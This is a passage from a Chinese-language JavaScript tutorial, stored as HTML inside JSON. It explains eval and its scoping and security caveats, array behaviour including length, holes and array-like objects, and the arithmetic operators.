    <a href='#基本用法' class='header-anchor'>#</a>\n            <span>基本用法</span>\n        </h3>\n    <p><code>eval</code>命令接受一个字符串作为参数，并将这个字符串当作语句执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;var a = 1;&#039;);\na // 1</code></pre><p>上面代码将字符串当作语句运行，生成了变量<code>a</code>。</p>\n<p>如果参数字符串无法当作语句运行，那么就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;3x&#039;) // Uncaught SyntaxError: Invalid or unexpected token</code></pre><p>放在<code>eval</code>中的字符串，应该有独自存在的意义，不能用来与<code>eval</code>以外的命令配合使用。举例来说，下面的代码将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;return;&#039;); // Uncaught SyntaxError: Illegal return statement</code></pre><p>上面代码会报错，因为<code>return</code>不能单独使用，必须在函数中使用。</p>\n<p>如果<code>eval</code>的参数不是字符串，那么会原样返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(123) // 123</code></pre><p><code>eval</code>没有自己的作用域，都在当前作用域内执行，因此可能会修改当前作用域的变量的值，造成安全问题。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\neval(&#039;a = 2&#039;);\n\na // 2</code></pre><p>上面代码中，<code>eval</code>命令修改了外部变量<code>a</code>的值。由于这个原因，<code>eval</code>有安全风险。</p>\n<p>为了防止这种风险，JavaScript 规定，如果使用严格模式，<code>eval</code>内部声明的变量，不会影响到外部作用域。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function f() {\n  &#039;use strict&#039;;\n  eval(&#039;var foo = 123&#039;);\n  console.log(foo);  // ReferenceError: foo is not defined\n})()</code></pre><p>上面代码中，函数<code>f</code>内部是严格模式，这时<code>eval</code>内部声明的<code>foo</code>变量，就不会影响到外部。</p>\n<p>不过，即使在严格模式下，<code>eval</code>依然可以读写当前作用域的变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function f() {\n  &#039;use strict&#039;;\n  var foo = 1;\n  eval(&#039;foo = 2&#039;);\n  console.log(foo);  // 2\n})()</code></pre><p>上面代码中，严格模式下，<code>eval</code>内部还是改写了外部变量，可见安全风险依然存在。</p>\n<p>总之，<code>eval</code>的本质是在当前作用域之中，注入代码。由于安全风险和不利于 JavaScript 引擎优化执行速度，所以一般不推荐使用。通常情况下，<code>eval</code>最常见的场合是解析 JSON 数据的字符串，不过正确的做法应该是使用原生的<code>JSON.parse</code>方法。</p>\n\n        <h3>\n            <a href='#eval-的别名调用' class='header-anchor'>#</a>\n            <span>eval 的别名调用</span>\n        </h3>\n    <p>前面说过<code>eval</code>不利于引擎优化执行速度。更麻烦的是，还有下面这种情况，引擎在静态代码分析的阶段，根本无法分辨执行的是<code>eval</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = eval;\nm(&#039;var x = 1&#039;);\nx // 1</code></pre><p>上面代码中，变量<code>m</code>是<code>eval</code>的别名。静态代码分析阶段，引擎分辨不出<code>m(&#39;var x = 1&#39;)</code>执行的是<code>eval</code>命令。</p>\n<p>为了保证<code>eval</code>的别名不影响代码优化，JavaScript 的标准规定，凡是使用别名执行<code>eval</code>，<code>eval</code>内部一律是全局作用域。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\n\nfunction f() {\n  var a = 2;\n  var e = eval;\n  e(&#039;console.log(a)&#039;);\n}\n\nf() // 1</code></pre><p>上面代码中，<code>eval</code>是别名调用，所以即使它是在函数中，它的作用域还是全局作用域，因此输出的<code>a</code>为全局变量。这样的话，引擎就能确认<code>e()</code>不会对当前的函数作用域产生影响，优化的时候就可以把这一行排除掉。</p>\n<p><code>eval</code>的别名调用的形式五花八门，只要不是直接调用，都属于别名调用，因为引擎只能分辨<code>eval()</code>这一种形式是直接调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval.call(null, &#039;...&#039;)\nwindow.eval(&#039;...&#039;)\n(1, eval)(&#039;...&#039;)\n(eval, eval)(&#039;...&#039;)</code></pre><p>上面这些形式都是<code>eval</code>的别名调用，作用域都是全局作用域。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Ben Alman, <a href=\"http://benalman.com/news/2010/11/immediately-invoked-function-expression/\">Immediately-Invoked Function Expression (IIFE)</a></li>\n<li>Mark Daggett, <a href=\"http://markdaggett.com/blog/2013/02/15/functions-explained/\">Functions Explained</a></li>\n<li>Juriy Zaytsev, <a href=\"http://kangax.github.com/nfe/\">Named function expressions demystified</a></li>\n<li>Marco Rogers polotek, <a href=\"http://docs.nodejitsu.com/articles/javascript-conventions/what-is-the-arguments-object\">What is the arguments object?</a></li>\n<li>Juriy Zaytsev, <a href=\"http://perfectionkills.com/global-eval-what-are-the-options/\">Global eval. What are the options?</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2014/01/eval.html\">Evaluating JavaScript code via eval() and new Function()</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"数组","link":"/types/array.html"}],"content":"\n        <h1>\n            <a href='#数组' class='header-anchor'>#</a>\n            <span>数组</span>\n        </h1>\n    \n        <h2>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h2>\n    <p>数组（array）是按次序排列的一组值。每个值的位置都有编号（从0开始），整个数组用方括号表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];</code></pre><p>上面代码中的<code>a</code>、<code>b</code>、<code>c</code>就构成一个数组，两端的方括号是数组的标志。<code>a</code>是0号位置，<code>b</code>是1号位置，<code>c</code>是2号位置。</p>\n<p>除了在定义时赋值，数组也可以先定义后赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\n\narr[0] = &#039;a&#039;;\narr[1] = &#039;b&#039;;\narr[2] = &#039;c&#039;;</code></pre><p>任何类型的数据，都可以放入数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [\n  {a: 1},\n  [1, 2, 3],\n  function() {return true;}\n];\n\narr[0] // Object {a: 1}\narr[1] // [1, 2, 3]\narr[2] // function (){return true;}</code></pre><p>上面数组<code>arr</code>的3个成员依次是对象、数组、函数。</p>\n<p>如果数组的元素还是数组，就形成了多维数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [[1, 2], [3, 4]];\na[0][1] // 2\na[1][1] // 4</code></pre>\n        <h2>\n            <a href='#数组的本质' class='header-anchor'>#</a>\n            <span>数组的本质</span>\n        </h2>\n    <p>本质上，数组属于一种特殊的对象。<code>typeof</code>运算符会返回数组的类型是<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof [1, 2, 3] // &quot;object&quot;</code></pre><p>上面代码表明，<code>typeof</code>运算符认为数组的类型就是对象。</p>\n<p>数组的特殊性体现在，它的键名是按次序排列的一组整数（0，1，2...）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\nObject.keys(arr)\n// [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;]</code></pre><p>上面代码中，<code>Object.keys</code>方法返回数组的所有键名。可以看到数组的键名就是整数0、1、2。</p>\n<p>由于数组成员的键名是固定的（默认总是0、1、2...），因此数组不用为每个元素指定键名，而对象的每个成员都必须指定键名。JavaScript 语言规定，对象的键名一律为字符串，所以，数组的键名其实也是字符串。之所以可以用数值读取，是因为非字符串的键名会被转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\narr[&#039;0&#039;] // &#039;a&#039;\narr[0] // &#039;a&#039;</code></pre><p>上面代码分别用数值和字符串作为键名，结果都能读取数组。原因是数值键名被自动转为了字符串。</p>\n<p>注意，这点在赋值时也成立。如果一个值总是先转成字符串，再进行赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [];\n\na[1.00] = 6;\na[1] // 6</code></pre><p>上面代码中，由于<code>1.00</code>转成字符串是<code>1</code>，所以通过数字键<code>1</code>可以读取值。</p>\n<p>上一章说过，对象有两种读取成员的方法：点结构（<code>object.key</code>）和方括号结构（<code>object[key]</code>）。但是，对于数值的键名，不能使用点结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.0 // SyntaxError</code></pre><p>上面代码中，<code>arr.0</code>的写法不合法，因为单独的数值不能作为标识符（identifier）。所以，数组成员只能用方括号<code>arr[0]</code>表示（方括号是运算符，可以接受数值）。</p>\n\n        <h2>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h2>\n    <p>数组的<code>length</code>属性，返回数组的成员数量。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a&#039;, &#039;b&#039;, &#039;c&#039;].length // 3</code></pre><p>JavaScript 使用一个32位整数，保存数组的元素个数。这意味着，数组成员最多只有 4294967295 个（2<sup>32</sup> - 1）个，也就是说<code>length</code>属性的最大值就是 4294967295。</p>\n<p>只要是数组，就一定有<code>length</code>属性。该属性是一个动态的值，等于键名中的最大整数加上<code>1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;];\narr.length // 2\n\narr[2] = &#039;c&#039;;\narr.length // 3\n\narr[9] = &#039;d&#039;;\narr.length // 10\n\narr[1000] = &#039;e&#039;;\narr.length // 1001</code></pre><p>上面代码表示，数组的数字键不需要连续，<code>length</code>属性的值总是比最大的那个整数键大<code>1</code>。另外，这也表明数组是一种动态的数据结构，可以随时增减数组的成员。</p>\n<p><code>length</code>属性是可写的。如果人为设置一个小于当前成员个数的值，该数组的成员会自动减少到<code>length</code>设置的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\narr.length // 3\n\narr.length = 2;\narr // [&quot;a&quot;, &quot;b&quot;]</code></pre><p>上面代码表示，当数组的<code>length</code>属性设为2（即最大的整数键只能是1）那么整数键2（值为<code>c</code>）就已经不在数组中了，被自动删除了。</p>\n<p>清空数组的一个有效方法，就是将<code>length</code>属性设为0。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\n\narr.length = 0;\narr // []</code></pre><p>如果人为设置<code>length</code>大于当前元素个数，则数组的成员数量会增加到这个值，新增的位置都是空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;];\n\na.length = 3;\na[1] // undefined</code></pre><p>上面代码表示，当<code>length</code>属性设为大于数组个数时，读取新增的位置都会返回<code>undefined</code>。</p>\n<p>如果人为设置<code>length</code>为不合法的值，JavaScript 会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 设置负值\n[].length = -1\n// RangeError: Invalid array length\n\n// 数组元素个数大于等于2的32次方\n[].length = Math.pow(2, 32)\n// RangeError: Invalid array length\n\n// 设置字符串\n[].length = &#039;abc&#039;\n// RangeError: Invalid array length</code></pre><p>值得注意的是，由于数组本质上是一种对象，所以可以为数组添加属性，但是这不影响<code>length</code>属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [];\n\na[&#039;p&#039;] = &#039;abc&#039;;\na.length // 0\n\na[2.1] = &#039;abc&#039;;\na.length // 0</code></pre><p>上面代码将数组的键分别设为字符串和小数，结果都不影响<code>length</code>属性。因为，<code>length</code>属性的值就是等于最大的数字键加1，而这个数组没有整数键，所以<code>length</code>属性保持为<code>0</code>。</p>\n<p>如果数组的键名是添加超出范围的数值，该键名会自动转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr[-1] = &#039;a&#039;;\narr[Math.pow(2, 32)] = &#039;b&#039;;\n\narr.length // 0\narr[-1] // &quot;a&quot;\narr[4294967296] // &quot;b&quot;</code></pre><p>上面代码中，我们为数组<code>arr</code>添加了两个不合法的数字键，结果<code>length</code>属性没有发生变化。这些数字键都变成了字符串键名。最后两行之所以会取到值，是因为取键值时，数字键名会默认转为字符串。</p>\n\n        <h2>\n            <a href='#in-运算符' class='header-anchor'>#</a>\n            <span>in 运算符</span>\n        </h2>\n    <p>检查某个键名是否存在的运算符<code>in</code>，适用于对象，也适用于数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\n2 in arr  // true\n&#039;2&#039; in arr // true\n4 in arr // false</code></pre><p>上面代码表明，数组存在键名为<code>2</code>的键。由于键名都是字符串，所以数值<code>2</code>会自动转成字符串。</p>\n<p>注意，如果数组的某个位置是空位，<code>in</code>运算符返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr[100] = &#039;a&#039;;\n\n100 in arr // true\n1 in arr // false</code></pre><p>上面代码中，数组<code>arr</code>只有一个成员<code>arr[100]</code>，其他位置的键名都会返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#for...in-循环和数组的遍历' class='header-anchor'>#</a>\n            <span>for...in 循环和数组的遍历</span>\n        </h2>\n    <p><code>for...in</code>循环不仅可以遍历对象，也可以遍历数组，毕竟数组只是一种特殊对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\n\nfor (var i in a) {\n  console.log(a[i]);\n}\n// 1\n// 2\n// 3</code></pre><p>但是，<code>for...in</code>不仅会遍历数组所有的数字键，还会遍历非数字键。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\na.foo = true;\n\nfor (var key in a) {\n  console.log(key);\n}\n// 0\n// 1\n// 2\n// foo</code></pre><p>上面代码在遍历数组时，也遍历到了非整数键<code>foo</code>。所以，不推荐使用<code>for...in</code>遍历数组。</p>\n<p>数组的遍历可以考虑使用<code>for</code>循环或<code>while</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\n\n// for循环\nfor(var i = 0; i &lt; a.length; i++) {\n  console.log(a[i]);\n}\n\n// while循环\nvar i = 0;\nwhile (i &lt; a.length) {\n  console.log(a[i]);\n  i++;\n}\n\nvar l = a.length;\nwhile (l--) {\n  console.log(a[l]);\n}</code></pre><p>上面代码是三种遍历数组的写法。最后一种写法是逆向遍历，即从最后一个元素向第一个元素遍历。</p>\n<p>数组的<code>forEach</code>方法，也可以用来遍历数组，详见《标准库》的 Array 对象一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var colors = [&#039;red&#039;, &#039;green&#039;, &#039;blue&#039;];\ncolors.forEach(function (color) {\n  console.log(color);\n});\n// red\n// green\n// blue</code></pre>\n        <h2>\n            <a href='#数组的空位' class='header-anchor'>#</a>\n            <span>数组的空位</span>\n        </h2>\n    <p>当数组的某个位置是空元素，即两个逗号之间没有任何值，我们称该数组存在空位（hole）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, , 1];\na.length // 3</code></pre><p>上面代码表明，数组的空位不影响<code>length</code>属性。</p>\n<p>需要注意的是，如果最后一个元素后面有逗号，并不会产生空位。也就是说，有没有这个逗号，结果都是一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3,];\n\na.length // 3\na // [1, 2, 3]</code></pre><p>上面代码中，数组最后一个成员后面有一个逗号，这不影响<code>length</code>属性的值，与没有这个逗号时效果一样。</p>\n<p>数组的空位是可以读取的，返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [, , ,];\na[1] // undefined</code></pre><p>使用<code>delete</code>命令删除一个数组成员，会形成空位，并且不会影响<code>length</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\ndelete a[1];\n\na[1] // undefined\na.length // 3</code></pre><p>上面代码用<code>delete</code>命令删除了数组的第二个元素，这个位置就形成了空位，但是对<code>length</code>属性没有影响。也就是说，<code>length</code>属性不过滤空位。所以，使用<code>length</code>属性进行数组遍历，一定要非常小心。</p>\n<p>数组的某个位置是空位，与某个位置是<code>undefined</code>，是不一样的。如果是空位，使用数组的<code>forEach</code>方法、<code>for...in</code>结构、以及<code>Object.keys</code>方法进行遍历，空位都会被跳过。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [, , ,];\n\na.forEach(function (x, i) {\n  console.log(i + &#039;. &#039; + x);\n})\n// 不产生任何输出\n\nfor (var i in a) {\n  console.log(i);\n}\n// 不产生任何输出\n\nObject.keys(a)\n// []</code></pre><p>如果某个位置是<code>undefined</code>，遍历的时候就不会被跳过。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [undefined, undefined, undefined];\n\na.forEach(function (x, i) {\n  console.log(i + &#039;. &#039; + x);\n});\n// 0. undefined\n// 1. undefined\n// 2. undefined\n\nfor (var i in a) {\n  console.log(i);\n}\n// 0\n// 1\n// 2\n\nObject.keys(a)\n// [&#039;0&#039;, &#039;1&#039;, &#039;2&#039;]</code></pre><p>这就是说，空位就是数组没有这个元素，所以不会被遍历到，而<code>undefined</code>则表示数组有这个元素，值是<code>undefined</code>，所以遍历不会跳过。</p>\n\n        <h2>\n            <a href='#类似数组的对象' class='header-anchor'>#</a>\n            <span>类似数组的对象</span>\n        </h2>\n    <p>如果一个对象的所有键名都是正整数或零，并且有<code>length</code>属性，那么这个对象就很像数组，语法上称为“类似数组的对象”（array-like object）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  0: &#039;a&#039;,\n  1: &#039;b&#039;,\n  2: &#039;c&#039;,\n  length: 3\n};\n\nobj[0] // &#039;a&#039;\nobj[1] // &#039;b&#039;\nobj.length // 3\nobj.push(&#039;d&#039;) // TypeError: obj.push is not a function</code></pre><p>上面代码中，对象<code>obj</code>就是一个类似数组的对象。但是，“类似数组的对象”并不是数组，因为它们不具备数组特有的方法。对象<code>obj</code>没有数组的<code>push</code>方法，使用该方法就会报错。</p>\n<p>“类似数组的对象”的根本特征，就是具有<code>length</code>属性。只要有<code>length</code>属性，就可以认为这个对象类似于数组。但是有一个问题，这种<code>length</code>属性不是动态值，不会随着成员的变化而变化。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  length: 0\n};\nobj[3] = &#039;d&#039;;\nobj.length // 0</code></pre><p>上面代码为对象<code>obj</code>添加了一个数字键，但是<code>length</code>属性没变。这就说明了<code>obj</code>不是数组。</p>\n<p>典型的“类似数组的对象”是函数的<code>arguments</code>对象，以及大多数 DOM 元素集，还有字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>// arguments对象\nfunction args() { return arguments }\nvar arrayLike = args(&#039;a&#039;, &#039;b&#039;);\n\narrayLike[0] // &#039;a&#039;\narrayLike.length // 2\narrayLike instanceof Array // false\n\n// DOM元素集\nvar elts = document.getElementsByTagName(&#039;h3&#039;);\nelts.length // 3\nelts instanceof Array // false\n\n// 字符串\n&#039;abc&#039;[1] // &#039;b&#039;\n&#039;abc&#039;.length // 3\n&#039;abc&#039; instanceof Array // false</code></pre><p>上面代码包含三个例子，它们都不是数组（<code>instanceof</code>运算符返回<code>false</code>），但是看上去都非常像数组。</p>\n<p>数组的<code>slice</code>方法可以将“类似数组的对象”变成真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = Array.prototype.slice.call(arrayLike);</code></pre><p>除了转为真正的数组，“类似数组的对象”还有一个办法可以使用数组的方法，就是通过<code>call()</code>把数组的方法放到对象上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>function print(value, index) {\n  console.log(index + &#039; : &#039; + value);\n}\n\nArray.prototype.forEach.call(arrayLike, print);</code></pre><p>上面代码中，<code>arrayLike</code>代表一个类似数组的对象，本来是不可以使用数组的<code>forEach()</code>方法的，但是通过<code>call()</code>，可以把<code>forEach()</code>嫁接到<code>arrayLike</code>上面调用。</p>\n<p>下面的例子就是通过这种方法，在<code>arguments</code>对象上面调用<code>forEach</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// forEach 方法\nfunction logArgs() {\n  Array.prototype.forEach.call(arguments, function (elem, i) {\n    console.log(i + &#039;. &#039; + elem);\n  });\n}\n\n// 等同于 for 循环\nfunction logArgs() {\n  for (var i = 0; i &lt; arguments.length; i++) {\n    console.log(i + &#039;. &#039; + arguments[i]);\n  }\n}</code></pre><p>字符串也是类似数组的对象，所以也可以用<code>Array.prototype.forEach.call</code>遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.forEach.call(&#039;abc&#039;, function (chr) {\n  console.log(chr);\n});\n// a\n// b\n// c</code></pre><p>注意，这种方法比直接使用数组原生的<code>forEach</code>要慢，所以最好还是先将“类似数组的对象”转为真正的数组，然后再直接调用数组的<code>forEach</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = Array.prototype.slice.call(&#039;abc&#039;);\narr.forEach(function (chr) {\n  console.log(chr);\n});\n// a\n// b\n// c</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/12/arrays.html\">Arrays in JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/06/dense-arrays.html\">JavaScript: sparse arrays vs. dense arrays</a></li>\n<li>Felix Bohm, <a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/what-they-didnt-tell-you-about-es5s-array-extras/\">What They Didn’t Tell You About ES5′s Array Extras</a></li>\n<li>Juriy Zaytsev, <a href=\"http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/\">How ECMAScript 5 still does not allow to subclass an array</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"算术运算符","link":"/operators/arithmetic.html"}],"content":"\n        <h1>\n            <a href='#算术运算符' class='header-anchor'>#</a>\n            <span>算术运算符</span>\n        </h1>\n    <p>运算符是处理数据的基本方法，用来从现有的值得到新的值。JavaScript 提供了多种运算符，覆盖了所有主要的运算。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 共提供10个算术运算符，用来完成基本的算术运算。</p>\n<ul>\n<li><strong>加法运算符</strong>：<code>x + y</code></li>\n<li><strong>减法运算符</strong>： <code>x - y</code></li>\n<li><strong>乘法运算符</strong>： <code>x * y</code></li>\n<li><strong>除法运算符</strong>：<code>x / y</code></li>\n<li><strong>指数运算符</strong>：<code>x ** y</code></li>\n<li><strong>余数运算符</strong>：<code>x % y</code></li>\n<li><strong>自增运算符</strong>：<code>++x</code> 或者 <code>x++</code></li>\n<li><strong>自减运算符</strong>：<code>--x</code> 或者 <code>x--</code></li>\n<li><strong>数值运算符</strong>： <code>+x</code></li>\n<li><strong>负数值运算符</strong>：<code>-x</code></li>\n</ul>\n<p>减法、乘法、除法运算法比较单纯，就是执行相应的数学运算。下面介绍其他几个算术运算符，重点是加法运算符。</p>\n\n        <h2>\n            <a href='#加法运算符' class='header-anchor'>#</a>\n            <span>加法运算符</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本规则' class='header-anchor'>#</a>\n            <span>基本规则</span>\n        </h3>\n    <p>加法运算符（<code>+</code>）是最常见的运算符，用来求两个数值的和。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + 1 // 2</code></pre><p>JavaScript 允许非数值的相加。</p>\n<pre class=\"prettyprint language-javascript\"><code>true + true // 2\n1 + true // 2</code></pre><p>上面代码中，第一行是两个布尔值相加，第二行是数值与布尔值相加。这两种情况，布尔值都会自动转成数值，然后再相加。</p>\n<p>比较特殊的是，如果是两个字符串相加，这时加法运算符会变成连接运算符，返回一个新的字符串，将两个原字符串连接在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039; + &#039;bc&#039; // &quot;abc&quot;</code></pre><p>如果一个运算子是字符串，另一个运算子是非字符串，这时非字符串会转成字符串，再连接在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + &#039;a&#039; // &quot;1a&quot;\nfalse + &#039;a&#039; // &quot;falsea&quot;</code></pre><p>加法运算符是在运行时决定，到底是执行相加，还是执行连接。也就是说，运算子的不同，导致了不同的语法行为，这种现象称为“重载”（overload）。由于加法运算符存在重载，可能执行两种运算，使用的时候必须很小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;3&#039; + 4 + 5 // &quot;345&quot;\n3 + 4 + &#039;5&#039; // &quot;75&quot;</code></pre><p>上面代码中，由于从左到右的运算次序，字符串的位置不同会导致不同的结果。</p>\n<p>除了加法运算符，其他算术运算符（比如减法、除法和乘法）都不会发生重载。它们的规则是：所有运算子一律转为数值，再进行相应的数学运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 - &#039;2&#039; // -1\n1 * &#039;2&#039; // 2\n1 / &#039;2&#039; // 0.5</code></pre><p>上面代码中，减法、除法和乘法运算符，都是将字符串自动转为数值，然后再运算。</p>\n\n        <h3>\n            <a href='#对象的相加' class='header-anchor'>#</a>\n            <span>对象的相加</span>\n        </h3>\n    <p>如果运算子是对象，必须先转成原始类型的值，然后再相加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj + 2 // &quot;[object Object]2&quot;</code></pre><p>上面代码中，对象<code>obj</code>转成原始类型的值是<code>[object Object]</code>，再加<code>2</code>就得到了上面的结果。</p>\n<p>对象转成原始类型的值，规则如下。</p>\n<p>首先，自动调用对象的<code>valueOf</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj.valueOf() // { p: 1 }</code></pre><p>一般来说，对象的<code>valueOf</code>方法总是返回对象自身，这时再自动调用对象的<code>toString</code>方法，将其转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj.valueOf().toString() // &quot;[object Object]&quot;</code></pre><p>对象的<code>toString</code>方法默认返回<code>[object Object]</code>，所以就得到了最前面那个例子的结果。</p>\n<p>知道了这个规则以后，就可以自己定义<code>valueOf</code>方法或<code>toString</code>方法，得到想要的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return 1;\n  }\n};\n\nobj + 2 // 3</code></pre><p>上面代码中，我们定义<code>obj</code>对象的<code>valueOf</code>方法返回<code>1</code>，于是<code>obj + 2</code>就得到了<code>3</code>。这个例子中，由于<code>valueOf</code>方法直接返回一个原始类型的值，所以不再调用<code>toString</code>方法。</p>\n<p>下面是自定义<code>toString</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  toString: function () {\n    return &#039;hello&#039;;\n  }\n};\n\nobj + 2 // &quot;hello2&quot;</code></pre><p>上面代码中，对象<code>obj</code>的<code>toString</code>方法返回字符串<code>hello</code>。前面说过，只要有一个运算子是字符串，加法运算符就变成连接运算符，返回连接后的字符串。</p>\n<p>这里有一个特例，如果运算子是一个<code>Date</code>对象的实例，那么会优先执行<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Date();\nobj.valueOf = function () { return 1 };\nobj.toString = function () { return &#039;hello&#039; };\n\nobj + 2 // &quot;hello2&quot;</code></pre><p>上面代码中，对象<code>obj</code>是一个<code>Date</code>对象的实例，并且自定义了<code>valueOf</code>方法和<code>toString</code>方法，结果<code>toString</code>方法优先执行。</p>\n\n        <h2>\n            <a href='#余数运算符' class='header-anchor'>#</a>\n            <span>余数运算符</span>\n        </h2>\n    <p>余数运算符（<code>%</code>）返回前一个运算子被后一个运算子除，所得的余数。</p>\n<pre class=\"prettyprint language-javascript\"><code>12 % 5 // 2</code></pre><p>需要注意的是，运算结果的正负号由第一个运算子的正负号决定。</p>\n<pre class=\"prettyprint language-javascript\"><code>-1 % 2 // -1\n1 % -2 // 1</code></pre><p>所以，为了得到负数的正确余数值，可以先使用绝对值函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 错误的写法\nfunction isOdd(n) {\n  return n % 2 === 1;\n}\nisOdd(-5) // false\nisOdd(-4) // false\n\n// 正确的写法\nfunction isOdd(n) {\n  return Math.abs(n % 2) === 1;\n}\nisOdd(-5) // true\nisOdd(-4) // false</code></pre><p>余数运算符还可以用于浮点数的运算。但是，由于浮点数不是精确的值，无法得到完全准确的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>6.5 % 2.1\n// 0.19999999999999973</code></pre>\n        <h2>\n            <a href='#自增和自减运算符' class='header-anchor'>#</a>\n            <span>自增和自减运算符</span>\n        </h2>\n    <p>自增和自减运算符，是一元运算符，只需要一个运算子。它们的作用是将运算子首先转为数值，然后加上1或者减去1。它们会修改原始变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n++x // 2\nx // 2\n\n--x // 1\nx // 1</code></pre><p>上面代码的变量<code>x</code>自增后，返回<code>2</code>，再进行自减，返回<code>1</code>。这两种情况都会使得，原始变量<code>x</code>的值发生改变。</p>\n<p>运算之后，变量的值发生变化，这种效应叫做运算的副作用（side effect）。自增和自减运算符是仅有的两个具有副作用的运算符，其他运算符都不会改变变量的值。</p>\n<p>自增和自减运算符有一个需要注意的地方，就是放在变量之后，会先返回变量操作前的值，再进行自增/自减操作；放在变量之前，会先进行自增/自减操作，再返回变量操作后的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = 1;\n\nx++ // 1\n++y // 2</code></pre><p>上面代码中，<code>x</code>是先返回当前值，然后自增，所以得到<code>1</code>；<code>y</code>是先自增，然后返回新的值，所以得到<code>2</code>。</p>\n\n        <h2>\n            <a href='#数值运算符，负数值运算符' 